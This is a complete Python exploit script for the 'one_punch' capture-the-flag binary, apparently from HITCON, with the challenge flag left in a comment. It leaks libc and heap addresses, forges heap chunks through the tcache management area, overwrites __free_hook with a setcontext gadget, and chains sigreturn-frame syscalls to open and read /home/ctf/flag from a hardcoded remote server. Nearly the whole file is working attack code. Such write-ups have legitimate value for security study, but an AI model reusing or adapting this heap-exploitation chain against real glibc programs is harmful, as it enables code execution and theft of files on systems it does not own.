#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './one_punch'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'52.198.120.1', 'port':48763})
                        # remote  = {'host':'localhost', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
offset_libc_set_rdx     = 0x0012be97

#==========

def attack(conn, **kwargs):
    op = OnePunch(conn)

    op.debut(0, '_'*0xb8)

    op.debut(0, 'a'*0x88)
    op.debut(1, 'b'*0x88)
    op.rename(1, 'b'*0x20 + p64(0x90) + p64(0x20) + 'b'*0x18 + p64(0x21))
    op.retire(1)
    op.debut(1, 'c'*0x88)

    for _ in range(6):
        op.debut(2, '_'*0x88)
        op.retire(2)
    for _ in range(7):
        op.debut(2, '_'*0x217)
        op.retire(2)

    op.retire(0)
    op.retire(1)

    addr_libc_mainarena = u(op.show(0)) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_setcontext= libc.sep_function['setcontext']
    addr_libc_set_rdx   = libc.address + offset_libc_set_rdx

    global addr_heap_base
    addr_heap_base      = u(op.show(1)) - 0x310
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    fake_chunk  = p64(addr_libc_mainarena + 0x60)
    fake_chunk += p64(addr_heap_base + 0x340)
    fake_chunk  = fake_chunk.ljust(0x28)
    fake_chunk += p64(0x91)
    fake_chunk += p64(addr_heap_base + 0x310)
    fake_chunk += p64(addr_heap_base + 0x430)
    op.rename(0, fake_chunk)
    op.rename(1, p64(addr_heap_base + 0x340) + p64(addr_libc_mainarena + 0x60))

    op.debut(0, 'A'*0x88)
    op.rename(0, 'A'*0x28 + p64(0x91) + p64(addr_libc_mainarena + 0x60) + p64(addr_heap_base + 0x430))
    op.debut(1, 'B'*0x88)

    # make fake chunk in tcache manage area
    op.rename(0, 'A'*0x28 + p64(0x21) + '\x00'*0x10)
    op.retire(1)
    op.rename(0, 'A'*0x28 + p64(0x31) + '\x00'*0x10)
    op.retire(1)
    op.rename(0, 'A'*0x28 + p64(0x3a1) + '\x00'*0x10)
    op.retire(1)
    for _ in range(3):
        op.rename(0, 'A'*0x28 + p64(0x3b1) + '\x00'*0x10)
        op.retire(1)
    # make double links correct
    op.rename(0, 'A'*0x20 + p64(0x300) + p64(0x13c0) + 'A'*0x10 + p64(addr_heap_base + 0x40)*2)
    # consolidate backward
    op.retire(1)

    op.debut(0, '\xff'*0x100+p64(addr_libc_free_hook))
    if env.check('remote'):
        op.serious(p64(addr_libc_set_rdx))
    else:
        op.serious(p64(addr_libc_setcontext + 0x57))

    op.syscall(constants.SYS_read, [constants.STDIN_FILENO, addr_heap_base + 0x1000, 0x100])
    conn.send('/home/ctf/flag\x00')
    op.syscall(constants.SYS_open, [addr_heap_base + 0x1000, 0, -1])
    op.syscall(constants.SYS_read, [3, addr_heap_base + 0x1000, 0x100])
    op.syscall(constants.SYS_write, [constants.STDOUT_FILENO, addr_heap_base + 0x1000, 0x100])

class OnePunch:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def debut(self, idx, name):
        self.sendlineafter('> ', '1')
        self.sendlineafter('idx: ', str(idx))
        self.sendafter('name: ', name)

    def rename(self, idx, name):
        self.sendlineafter('> ', '2')
        self.sendlineafter('idx: ', str(idx))
        self.sendafter('name: ', name)

    def show(self, idx):
        self.sendlineafter('> ', '3')
        self.sendlineafter('idx: ', str(idx))
        self.recvuntil('name: ')
        return self.recvuntil('\n######', drop=True)

    def retire(self, idx):
        self.sendlineafter('> ', '4')
        self.sendlineafter('idx: ', str(idx))

    def serious(self, data):
        self.sendlineafter('> ', '50056')
        self.send(data)

    def syscall(self, sysno, args):
        frame = SigreturnFrame()
        frame.rdi = sysno
        frame.rsi = args[0]
        frame.rdx = args[1]
        frame.rcx = args[2]
        frame.rip = libc.symbols['syscall']
        self.rename(0, p64(libc.sep_function['setcontext']+0x57) + p64(addr_heap_base+0x50) + str(frame)[0x10:])
        self.retire(0)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    # hitcon{y0u_f0rg0t_h0u23_0f_10r3_0r_4fra1d_1ar93_b1n_4tt4ck}

#==========
